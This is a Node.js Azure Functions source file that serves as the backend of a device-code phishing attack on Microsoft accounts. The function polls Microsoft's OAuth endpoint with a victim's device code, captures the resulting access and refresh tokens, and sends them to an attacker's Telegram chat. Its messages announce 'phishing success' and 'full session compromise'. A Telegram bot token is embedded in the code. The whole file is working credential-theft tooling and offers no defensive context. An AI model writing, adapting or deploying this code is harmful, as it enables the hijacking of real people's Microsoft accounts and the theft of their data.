const { app } = require("@azure/functions");
const axios = require('axios');

const client_id = '00b41c95-dab0-4487-9791-b9d2c32c80f2';
const token_endpoint = "https://login.microsoftonline.com/common/oauth2/token";

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = '7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || ''; // Set this in Azure app settings

async function sendTelegramAlert(message) {
  if (!TELEGRAM_CHAT_ID) {
    console.log('Telegram Chat ID not configured');
    return;
  }
  
  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });
  } catch (error) {
    console.error('Telegram notification failed:', error.message);
  }
}

app.http("poll", {
  methods: ["PUT"],
  authLevel: "anonymous",
  route: "/deviceCode",
  handler: async (request, context) => {

    try {
      const request_body = await request.json();

      context.log(`🎯 DEVICE CODE POLLING STARTED: ${JSON.stringify(request_body)}`)
      let devicecode = null;
      let poll_count = 0;
      // poll for a maximum of 3 minutes (5s * 12 * 3 = 180s) - reduced to prevent timeout
      while (!devicecode && poll_count++ < 12 * 3) {
        try {
          devicecode = await axios.post(token_endpoint, {
            "client_id": client_id,
            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
            "resource": "https://graph.microsoft.com",
            "code": request_body.device_code
          }, {
            headers: {
              'Content-Type': 'application/x-www-form-urlencoded',
              'User-Agent': 'AzureAiTMFunction'
            }
          }).then(response => {
            context.log(`✅ TOKEN RESPONSE: ${response.status}`)
            return response.data
          });
        } catch (ex) {
          // Better error handling
          if (ex.response && ex.response.data && ex.response.data.error === "authorization_pending") {
            context.log(`⏳ Authorization pending... (poll ${poll_count})`);
          } else {
            context.log(`❌ POLLING ERROR: ${ex.message}`);
            if (ex.response && ex.response.data) {
              context.log(`❌ ERROR DATA: ${JSON.stringify(ex.response.data)}`);
            }
          }
        }

        if (devicecode) {
          context.log(`🔥🔥🔥 DEVICE CODE SUCCESS: ${JSON.stringify(devicecode)}`)
          
          // Send success notification to Telegram
          const successMessage = `🔥🔥🔥 *DEVICE CODE PHISHING SUCCESS!* 🔥🔥🔥\n\n` +
            `*Device Code:* \`${request_body.device_code.substring(0, 20)}...\`\n` +
            `*Access Token:* \`${devicecode.access_token ? devicecode.access_token.substring(0, 50) + '...' : 'None'}\`\n` +
            `*Refresh Token:* ${devicecode.refresh_token ? 'CAPTURED' : 'None'}\n` +
            `*Token Type:* ${devicecode.token_type}\n` +
            `*Scope:* ${devicecode.scope}\n` +
            `*Expires In:* ${devicecode.expires_in} seconds\n` +
            `*Time:* ${new Date().toISOString()}\n\n` +
            `*STATUS: FULL SESSION COMPROMISE ACHIEVED* ✅`;
          
          await sendTelegramAlert(successMessage);
          break;
        } else {
          context.log(`⏳ No device code yet, polling again... (${poll_count}/36)`)
        }

        await new Promise(resolve => setTimeout(resolve, 5000));
      }

      if (!devicecode) {
        context.log(`⌛ DEVICE CODE POLLING TIMEOUT after ${poll_count} attempts`);
        
        // Send timeout notification
        const timeoutMessage = `⌛ *DEVICE CODE POLLING TIMEOUT*\n\n` +
          `*Device Code:* \`${request_body.device_code.substring(0, 20)}...\`\n` +
          `*Attempts:* ${poll_count}\n` +
          `*Time:* ${new Date().toISOString()}\n\n` +
          `*Status:* User did not complete authentication`;
        
        await sendTelegramAlert(timeoutMessage);
      }

      // return 204 no content
      return new Response(JSON.stringify({ status: 'polling_complete', attempts: poll_count }), {
        status: 200,
        headers: { 'Content-Type': 'application/json' }
      });

    } catch (error) {
      context.log(`💥 FATAL POLLING ERROR: ${error.message}`);
      
      // Send error notification
      const errorMessage = `💥 *DEVICE CODE POLLING ERROR*\n\n` +
        `*Error:* ${error.message}\n` +
        `*Time:* ${new Date().toISOString()}`;
      
      await sendTelegramAlert(errorMessage);
      
      return new Response(JSON.stringify({ error: error.message }), {
        status: 500,
        headers: { 'Content-Type': 'application/json' }
      });
    }
  },
});